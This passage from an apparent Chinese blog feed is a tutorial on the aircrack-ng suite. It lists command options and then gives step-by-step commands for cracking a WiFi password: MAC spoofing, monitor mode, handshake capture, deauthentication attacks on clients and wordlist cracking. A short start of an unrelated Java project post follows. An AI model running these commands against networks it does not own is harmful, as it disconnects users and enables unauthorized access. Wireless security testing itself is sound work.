统计数据。有助于调试和一般的注入优化。它表明如果你注入，注入太快，到达 AP，帧是有效的加密帧。允许探测“隐藏”的站，因为它们太远，无法捕获高比特率帧，因为 ACK 帧以每秒 1Mbps 的速度发送。-h：隐藏的站点. </p><p>–berlin &lt;secs&gt;：当不再接收到任何数据包时，从屏幕上删除 AP&#x2F;client 之前的时间(默认为120 秒)。 </p><p>-c &lt;channel&gt;[,&lt;channel&gt;[,…]],–channel &lt;channel&gt;[,&lt;\channel&gt;[,…]]：指出要监听的频道。默认情况下，airodump-ng 在所有 2.4GHz 通道上跳转。 </p><p>-b &lt;abg&gt;,–band &lt;abg&gt;：指出 airodump-ng 应该跳的波段。它可以是“a”、“b”和“g”字母的组合(“b”和“g”使用 2.4GHz，“a”使用 5GHz)。与——通道选项不兼容。 </p><p>-s &lt;method&gt;,–cswitch &lt;method&gt;：定义 airodump-ng 在使用多个网卡时设置通道的方式。 有效值:0 (FIFO，默认值)、1(轮询)或 2(最后一跳)。 </p><p>-2,–ht20：将通道设置为 HT20 (802.11n)。 </p><p>-3,–ht40+：设置通道为 HT40+ (802.11n)。它要求 20MHz 以上的频率是可用的(4 通道以上)，因此一些通道在 HT40+中是不可用的。HT40+在美国只有 7 个频道可用(欧洲大部分地区有9 个)。 </p><p>-5,–ht40-：将通道设置为 HT40-(802.11n)。它要求 20MHz 以下的频率是可用的(4 个通道是低的)，因此一些通道在 HT40-中是不可用的。在 2.4GHz 中，HT40 通道从 5 通道开始。 </p><p>-r &lt;file&gt;：从文件中读取数据包。 </p><p>-x &lt;msecs&gt;：主动扫描模拟(发送探测请求并解析探测响应)。 </p><p>-M,–manufacturer：显示一个制造商列，其中包含从 IEEE OUI 列表获得的信息。 </p><p>-U,–update：显示从其信标时间戳获得的 APs 正常运行时间。 </p><p>-W,–wps：显示 WPS 列，其中包含 WPS 版本、配置方法、从 APs 信标或探针响应(如果有的话)获得的 AP 设置锁定。 </p><p>–output-format &lt;formats&gt;：定义要使用的格式(用逗号分隔)。可能的值是:pcap, ivs, csv, gps, kismet, netxml。默认值为:pcap、csv、kismet、kismt -newcore。“pcap”是用于以 pcap 格式记录捕获的，“ivs”是用于 ivs 格式的(它是—ivs 的快捷方式)。“csv”将创建一个 airodump-ng csv 文件，“kismet”将创建一个 kismet csv 文件，“kismet-newcore”将创建一个 kismet netxml文件。“gps”是 gps 的简写。除 ivs 和 pcap 外，这些值可以合并。 </p><p>-I &lt;seconds&gt;,–write-interval &lt;seconds&gt;：输出文件的写入间隔为 CSV, Kismet CSV 和 Kismet NetXML，以秒为单位(最少 1 秒)。默认:5 秒。注意，间隔太小可能会减慢 airodump-ng。 </p><p>-K &lt;enable&gt;,–background &lt;enable&gt;：覆盖自动后台检测。使用“0”强制前台设置，使用“1”强制后台设置。它不会使 airodump-ng 作为守护进程运行，它将跳过后台自动检测和强制启用&#x2F;禁用交互模式和显示更新。 </p><p>–ignore-negative-one：删除“固定通道&lt;接口&gt;:-1”的消息 </p><p>Filter options: 过滤选项： </p><p>-t &lt;OPN|WEP|WPA|WPA1|WPA2&gt;,–encrypt &lt;OPN|WEP|WPA|WPA1|WPA2&gt;：将只显示与给定加密匹配的网络。可以多次指定:’-t OPN -t WPA2’ </p><p>-d &lt;bssid&gt;,–bssid &lt;bssid&gt;：将只显示与给定 bssid 匹配的网络。 </p><p>-m &lt;mask&gt;,–netmask &lt;mask&gt;：将只显示网络，匹配给定的 bssid ^网掩码组合。需要–bssid(或-d)需要指定。 </p><p>-a：只显示关联的客户端。 </p><p>-N,–essid：通过 ESSID 过滤 APs。可以多次使用以匹配一组 ESSID。 </p><p>-R,–essid-regex：使用正则表达式通过 ESSID 过滤 APs。 </p><h4 id="2、使用示例-1"><a href="#2、使用示例-1" class="headerlink" title="2、使用示例"></a>2、使用示例</h4><p>（1）只显示 ivs 信息，不保存扫描文件</p><p>airodump-ng -i wlan0mon</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps53.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps53.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"> </p><p>1.BSSID–无线AP（路由器）的MAC地址，如果你想PJ哪个路由器的密码就把这个信息记下来备用。<br>2.PWR–这个值的大小反应信号的强弱，越大越好。很重要！！！<br>3.RXQ–丢包率，越小越好，此值对PJ密码影响不大，不必过于关注、<br>4.Beacons–准确的含义忘记了，大致就是反应客户端和AP的数据交换情况，通常此值不断变化。<br>5.#Data–这个值非常重要，直接影响到密码PJ的时间长短，如果有用户正在下载文件或看电影等大量数据传输的话，此值增长较快。<br>6.CH–工作频道。<br>7.MB–连接速度<br>8.ENC–编码方式。通常有WEP、WPA、TKIP等方式，本文所介绍的方法在WEP下测试100%成功，其余方式本人 并未验证。<br>9.ESSID–可以简单的理解为局域网的名称，就是通常我们在搜索无线网络时看到的列表里面的各个网络的名称</p><p>（2）以 ivs 格式保存扫描文件为 test</p><p>airodump-ng -i -w test wlan0mon</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps54.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps54.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"> </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps55.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps55.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"> </p><p>（3）获取位置信息</p><p>airodump-ng -g wlan0mon</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps56.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps56.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"> </p><p>（4）扫描指定信道</p><p>airodump-ng -c 6 wlan0mon</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps57.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps57.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"> </p><p>（5）将扫描到指定信道的信息包含位置信息保存到文件 test 中，将生成 6 个新文件</p><p>airodump-ng -c 6 -w test -g wlan0mon</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps58.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps58.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"> </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps59.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps59.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"> </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps60.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps60.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"> </p><p>（6）将扫描到指定信道的信息包含位置信息保存到文件 test 中，并指定输出格式为 pcap，将生成两个新文件</p><p>airodump-ng -c 6 -w test -g –output-format pcap wlan0mon</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps61.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps61.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"> </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps62.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps62.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"> </p><h3 id="（四）-Aireplay-ng"><a href="#（四）-Aireplay-ng" class="headerlink" title="（四） Aireplay-ng"></a>（四） Aireplay-ng</h3><p>Aireplay-ng 用于注入帧。主要功能是产生流量在以后使用了 Aircrack-ng的用于裂化 WEP 和 WPA-PSK 的密钥。为了捕获 WPA 握手数据，伪造的身份验证，交互式数据包重播，手工制作的 ARP 请求注入和 ARP 请求重新注入，有多种攻击可能会导致取消认证。 </p><h4 id="1、语法格式-2"><a href="#1、语法格式-2" class="headerlink" title="1、语法格式"></a>1、语法格式</h4><p>【语法】aireplay-ng &lt;options&gt; &lt;replay interface&gt; </p><p><em><strong>*过滤器选项：*</strong></em> </p><p>-b bssid：MAC 地址，访问点 </p><p>-d dmac：MAC 地址，目标 </p><p>-s smac：MAC 地址，源 </p><p>-m len：最小数据包长度 </p><p>-n len：最大数据包长度 </p><p>-u type：帧控制，类型字段 </p><p>-v subt：帧控制，子类型字段 </p><p>-t tods：帧控制，至 DS 位 </p><p>-f fromds：帧控制，从 DS 位开始 </p><p>-w iswep：帧控制，WEP 位 </p><p>对于除身份验证和伪身份验证以外的所有攻击，您可以使用以下过滤器来限制将哪些数据包呈现给特定攻击。最常用的过滤器选项是 “-b”，用于选择特定的接入点。对于典型用法，“-b”是您唯一使用的一个。 </p><p><em><strong>*重播选项：*</strong></em> </p><p>-x nbpps：每秒的数据包数 </p><p>-p fctrl：设置帧控制字（十六进制） </p><p>-a bssid：设置接入点 MAC 地址 </p><p>-c dmac：设置目标 MAC 地址 </p><p>-h smac：设置源 MAC 地址 </p><p>-e essid：对于 fakeauth 攻击或注入测试，它设置目标 AP SSID。当未隐藏 SSID 时，这是可选的。 </p><p>-j：arpreplay 攻击：注入 FromDS pkts </p><p>-g value：更改环形缓冲区的大小（默认值：8）-k IP：在片段中设置目标 IP </p><p>-l IP：在片段中设置源 IP </p><p>-o npckts：每个突发的包数（-1） </p><p>-q sec：保持活动之间的秒数（-1） </p><p>-y prga：共享密钥验证的密钥流 </p><p>-B 或 -bittest：比特率测试（仅适用于测试模式） </p><p>-D：禁用 AP 检测。如果未听到 AP 信标，则某些模式将无法继续。这将禁用此功能。 </p><p>-F 或 -fast：选择第一个匹配的数据包。对于测试模式，它仅检查基本注入并跳过所有其他测试。 </p><p>-R 禁用 &#x2F;dev&#x2F;rtc 使用。一些系统遇到 RTC 的锁定或其他问题。这将禁用用法。 </p><p><em><strong>*来源选项：*</strong></em> </p><p>iface：从此接口捕获数据包 </p><p>-r 文件：从该 pcap 文件中提取数据包 </p><p>****攻击方式****（仍然可以使用数字）： </p><p>–deauth count：取消对 1 个或所有工作站的认证（-0） </p><p>–fakeauth 延迟：与 AP 的伪认证（-1） </p><p>–interactive：交互式帧选择（-2） </p><p>–arpreplay：标准 ARP 请求重播（-3） </p><p>–chopchop：解密 &#x2F; 斩波 WEP 数据包（-4） </p><p>–fragment：生成有效的密钥流（-5） </p><h4 id="2、使用示例-2"><a href="#2、使用示例-2" class="headerlink" title="2、使用示例"></a>2、使用示例</h4><p><strong>获取握手包</strong></p><p>airodump-ng –bssid [目标wifimac] -c [目标wifi信道] -w [保存的文件名] wlan0mon</p><p>这里-c指定的扫描信道就是后续攻击的信道</p><p>注意!!!这里一定要与对方wifi信道相同否则抓不到握手包,也攻击不了</p><p>重新扫描一遍：由于是开的个人热点进行攻击，所以指定协议为WAP2</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps63.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps63.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"> </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps64.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps64.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"> </p><p>然后在上面命令运行的同时，再开一个终端进行攻击：</p><p>aireplay-ng -0 5 -a 8A:99:70:05:47:05 -c 7C:B2:7D:64:49:FC wlan0mon</p><p>获取到了握手包WPA handshake 8A:99:70:05:47:05</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps65.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps65.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"> </p><p>解释：-0为模式中的一种：冲突攻击模式，后面跟发送次数（设置为0，则为循环攻击，不停的断开连接，客户端无法正常上网，-a 指定无线AP的mac地址，即为该无线网的bssid值，上图可以一目了然。</p><p>-0：取消认证攻击 </p><p>1：攻击 1 次 </p><p>-a：要攻击的 AP MAC 地址 </p><p>-c：客户端的 MAC 地址 </p><p>Wlan0mon：使用的接口</p><h3 id="（五）-Aircrack-ng"><a href="#（五）-Aircrack-ng" class="headerlink" title="（五） Aircrack-ng"></a>（五） Aircrack-ng</h3><p>Aircrack-ng 是 802.11 WEP 和 WPA &#x2F; WPA2-PSK 密 钥 破 解 程 序 。 一 旦使用airodump-ng 捕获了足够的加密数据包，Aircrack-ng 即可恢复 WEP 密钥。为了破解 WPA &#x2F; WPA2 预共享密钥，仅使用字典方法。 </p><h4 id="1、语法格式-3"><a href="#1、语法格式-3" class="headerlink" title="1、语法格式"></a>1、语法格式</h4><p>【语法】aircrack-ng [options] &lt;capture file(s)&gt; </p><p><em><strong>*常用选项：*</strong></em> </p><p>-a amode：强制攻击模式（1 &#x3D; 静态 WEP，2 &#x3D; WPA &#x2F; WPA2-PSK） </p><p>-e essid：如果设置，将使用来自具有相同 ESSID 的网络的所有 IV。如果未广播 ESSID （隐藏），则 WPA &#x2F; WPA2-PSK 破解也需要此选项。 </p><p>-b bssid：长版–bssid。根据接入点的 MAC 地址选择目标网络 </p><p>-p nbcpu：在 SMP 系统上：要使用的 CPU 数量。此选项在非 SMP 系统上无效 </p><p>-q none：启用安静模式（在没有找到密钥之前不输出状态） </p><p>-C MACs：长版–combine。将给定的 AP（以逗号分隔）合并为虚拟 AP </p><p>-l file name：（小写 L，ell）将密钥记录到指定的文件。覆盖文件（如果已存在） </p><p><em><strong>*WEP 和 WPA-PSK 破解选项：*</strong></em> </p><p>-w words：单词列表或“-”的路径，用逗号分隔多个单词表 </p><p>-N file：创建一个新的破解会话并将其保存到指定的文件 </p><p>-R file：从指定文件还原破解会话 </p><p><em><strong>*WPA-PSK 选项：*</strong></em> </p><p>-E file： 创建 EWSA 项目文件 v3 </p><p>-j file：创建 Hashcat v3.6 + Capture 文件（HCCAPX） </p><p>-J file：创建 Hashcat Capture 文件 </p><p>-S none：WPA 破解速度测试 </p><p>-Z sec：WPA 破解速度测试执行时间，以秒为单位 </p><p>-r database：利用 airolib-ng 生成的数据库作为输入来确定 WPA 密钥。如果 aircrack-ng 尚未使用 sqlite 支持进行编译，则输出错误消息 </p><h4 id="2、使用示例-3"><a href="#2、使用示例-3" class="headerlink" title="2、使用示例"></a>2、使用示例</h4><p>使用字典 wordlist.txt 破解 hack-02.cap 握手包对应 AP 的密码</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps66.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps66.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"> </p><p>这是上一步抓到的握手包，新建一个wordlist.text进行攻击：</p><p>aircrack-ng -w wordlist.txt thekai-01.cap</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps67.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps67.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"> </p><h3 id="（六）-ifconfig：用于查看和修改网卡状态"><a href="#（六）-ifconfig：用于查看和修改网卡状态" class="headerlink" title="（六） ifconfig：用于查看和修改网卡状态"></a>（六） ifconfig：用于查看和修改网卡状态</h3><h4 id="1、语法格式-4"><a href="#1、语法格式-4" class="headerlink" title="1、语法格式"></a>1、语法格式</h4><p>【语法】ifconfig [-a] [-s] [interface] [down|up] </p><p>-a：列出连接到当前系统的所有接口详细信息 </p><p>-s：列出所有可用接口 </p><p>interface：接口相关参数 </p><p>down：关闭指定网卡 </p><p>up：激活指定网卡 </p><h4 id="2、使用示例-4"><a href="#2、使用示例-4" class="headerlink" title="2、使用示例"></a>2、使用示例</h4><p>（1）查看本机接口信息</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps68.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps68.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"> </p><p>（2）列出所有可用接口</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps69.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps69.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"> </p><p>（3）关闭指定网卡</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps70.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps70.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"> </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps71.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps71.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"> </p><p>（4）激活指定网卡</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps72.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps72.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"> </p><h3 id="（七）-macchanger：伪造-MAC-地址"><a href="#（七）-macchanger：伪造-MAC-地址" class="headerlink" title="（七） macchanger：伪造 MAC 地址"></a>（七） macchanger：伪造 MAC 地址</h3><h4 id="1、语法格式-5"><a href="#1、语法格式-5" class="headerlink" title="1、语法格式"></a>1、语法格式</h4><p>【语法】macchanger [option] device </p><p>-a：伪造一个同厂的同类型随机 MAC 地址 </p><p>-A：伪造一个不同厂商不同类型的 MAC 地址 </p><p>-e：伪造一个同厂的随机 MAC 地址 </p><p>-s,–show：打印当前的 MAC。 当未指定其他选项时，这是默认操作。 </p><p>-r,–random：设置完全随机的 MAC。 </p><p>-m xx:xx:xx:xx:xx:xx </p><p>–mac&#x3D;xx:xx:xx:xx:xx:xx 修改为指定的 mac 地址 </p><p>-p,–permanent：将 MAC 地址重置为其原始的永久硬件值 </p><h4 id="2、使用示例-5"><a href="#2、使用示例-5" class="headerlink" title="2、使用示例"></a>2、使用示例</h4><p>（1）伪造一个同厂的同类型随机 MAC 地址。注意：若网卡为激活状态，则无法修改 MAC 地址，会显示设备忙。</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps73.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps73.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"> </p><p>（2）伪造一个不同厂商不同类型的 MAC 地址</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps74.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps74.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"> </p><p>（3）伪造一个同厂的随机 MAC 地址</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps75.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps75.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"> </p><p>（4）修改为指定的 MAC 地址 </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps76.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps76.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"> </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps77.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps77.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"> </p><p>（5）取消伪造的 MAC 地址</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps78.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps78.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"> </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps79.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps79.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"> </p><h3 id="（八）-iwconfig：配置无线网络设备或显示无线网络设备信息"><a href="#（八）-iwconfig：配置无线网络设备或显示无线网络设备信息" class="headerlink" title="（八） iwconfig：配置无线网络设备或显示无线网络设备信息"></a>（八） iwconfig：配置无线网络设备或显示无线网络设备信息</h3><h4 id="1、语法格式-6"><a href="#1、语法格式-6" class="headerlink" title="1、语法格式"></a>1、语法格式</h4><p>【语法】iwconfig [interface] [option] </p><p>auto:自动模式 </p><p>essid:设置 ESSID </p><p>nwid:设置网络 ID </p><p>freq:设置无线网络通信频段 </p><p>chanel:设置无线网络通信频段 </p><p>sens:设置无线网络设备的感知阀值 </p><p>mode:设置无线网络设备的通信设备 </p><p>ap:强迫无线网卡向给定地址的接入点注册 </p><p>nick &lt;名字&gt;：为网卡设定别名 </p><p>rate &lt;速率&gt;：设定无线网卡的速率 </p><p>rts &lt;阀值&gt;：在传输数据包之前增加一次握手，确信信道在正常的 </p><p>power：无线网卡的功率设置 </p><h4 id="2、使用示例-6"><a href="#2、使用示例-6" class="headerlink" title="2、使用示例"></a>2、使用示例</h4><p>（1）查看无线网卡信息</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps80.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps80.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"> </p><p>（2）设备无线网卡工作模式为 monitor。注意：若网卡在激活状态，则会显示设备繁忙</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps81.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps81.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"> </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps82.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps82.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"> </p><p>三、aircrack-ng Wifi 密码破解基本步骤 </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps83.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps83.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"> </p><p>四、Wifi 密码破解实例 </p><p>1、Down 掉网卡：ifconfig wlan0 down</p><p>2、伪造 MAC 地址：macchanger –e wlan0 </p><p>3、激活网卡：ifconfig wlan0 up </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps84.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps84.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"> </p><p>4、设置监听模式 </p><p>（1）结束占用无线网卡的进程：airmon-ng check kill </p><p>（2）开启无线网卡监听模式：airmon-ng start wlan0 </p><p>（3）查看无线网卡状态：iwconfig</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps85.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps85.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"> </p><p>5、探测网络，查看周围 Wifi 信息：airodump-ng wlan0mon</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps86.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps86.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"> </p><p>6、监听抓包：airodump-ng –ivs –bssid AP_MAC –w hack wlan0mon </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps87.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps87.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"> </p><p>7、攻击网络（需新开一个终端）：aireplay-ng -0 1 –a AP_Mac –c Client_Mac wlan0mon </p><p>在监听抓包时，需要要求指定的 AP 有正在进行连接认证的客户端以获取握手包，若无正在认证客户端，将会导致长时间无法抓包成功，这时可以人为的将已经连接的客户强制断开。因为在连接 Wifi 时一般都选择了自动连接，所以一旦断开，客户端将会立即重新连接，此时就可以捕获到握手包。若一次不成功，则可以多攻击几次，但攻击次数过多有可能引起目标 AP 警觉，严重时可导致 AP 死机。</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps88.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps88.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"> </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps89.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps89.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"> </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps90.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps90.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"> </p><p>8、破解密码：aircrack-ng –w wordlist.txt thakai-05.ivs</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps91.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps91.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"> </p>]]></content>
      
      
      <categories>
          
          <category> 杂七杂八 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> aircrack-ng </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java书城全开发流程</title>
      <link href="/2023/05/20/java-shu-cheng-kai-fa-quan-liu-cheng/"/>
      <url>/2023/05/20/java-shu-cheng-kai-fa-quan-liu-cheng/</url>
      
        <content type="html"><![CDATA[<p>源码及答辩论文：<a href="https://github.com/godownio/anzfloor">https://github.com/godownio/anzfloor</a></p><p>使用时请更改配置文件数据库账号与密码，并导入SQL</p><h2 id="框架图"><a href="#框架图" class="headerlink" title="框架图"></a>框架图</h2><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps1.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps1.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></p><table><thead><tr><th>资源需求分析</th><th></th><th></th></tr></thead><tbody><tr><td>硬件资源</td><td>CPU</td><td>lntel(R) Core(TM) i7-1065G7 CPU @1.30GHz</td></tr><tr><td></td><td>显卡</td><td>lntel(R)lris(R)Plus Graphics</td></tr><tr><td></td><td>内存</td><td>DDR4 